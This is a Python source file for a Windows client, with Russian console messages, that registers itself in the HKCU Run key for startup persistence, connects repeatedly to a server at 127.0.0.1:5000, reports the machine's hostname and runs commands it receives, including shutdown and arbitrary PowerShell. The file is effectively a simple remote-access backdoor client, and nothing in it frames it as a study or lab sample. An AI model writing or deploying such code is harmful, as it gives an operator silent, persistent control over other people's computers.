import socket
import winreg
import os
import sys
import time
import platform
import subprocess

HOST = "127.0.0.1"
PORT = 5000

hostname = platform.node()


def add_to_startup():
    app_name = "MyClient"

    if getattr(sys, 'frozen', False):
        path = sys.executable
    else:
        path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
    except:
        pass


def handle_command(cmd):
    cmd = cmd.strip()

    if cmd == "SHUTDOWN":
        print("Получена команда: ВЫКЛЮЧЕНИЕ ПК")
        subprocess.Popen("shutdown /s /t 0", shell=True)

    elif cmd.startswith("POWERSHELL|"):
        ps_command = cmd.split("|", 1)[1]
        print(f"Получена команда PowerShell: {ps_command}")
        subprocess.Popen(f'start powershell -NoExit -Command "{ps_command}"', shell=True)

    elif cmd == "POWERSHELL":
        print("Получена команда: ЗАПУСК PowerShell")
        subprocess.Popen("start powershell", shell=True)


def start_client():
    while True:
        try:
            s = socket.socket()
            s.connect((HOST, PORT))

            while True:
                s.send(f"ONLINE|{hostname}".encode())
                time.sleep(5)

                s.settimeout(1)
                try:
                    data = s.recv(1024).decode()
                    if data:
                        for line in data.split("\n"):
                            if line:
                                handle_command(line)
                except socket.timeout:
                    pass

        except Exception as e:
            print("Ошибка:", e)
            time.sleep(5)


add_to_startup()
start_client()